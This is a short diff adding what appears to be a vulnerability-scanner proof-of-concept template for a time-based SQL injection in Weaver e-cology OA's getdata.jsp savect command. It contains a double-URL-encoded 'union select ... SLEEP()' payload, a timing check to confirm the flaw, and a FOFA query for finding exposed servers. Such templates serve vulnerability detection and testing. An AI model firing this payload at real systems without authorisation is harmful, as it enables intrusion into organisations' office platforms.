@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-e-cology-savect-sqli
+info:
+  name: 泛微OA e-cology savect SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  t3: concat("1 union select 1,2,3,4,5,SLEEP(",str(t1),") \x23")
+  t4: urlencode(urlencode(t3))
+requests:
+- method: GET
+  path: /js/hrm/getdata.jsp?cmd=savect&arg0={{.t4}}
+  expression: status_code == 200 && trim(body) == "" && contains(headers,"ecology")
+    && duration > t1 && duration < t2
+transport: http
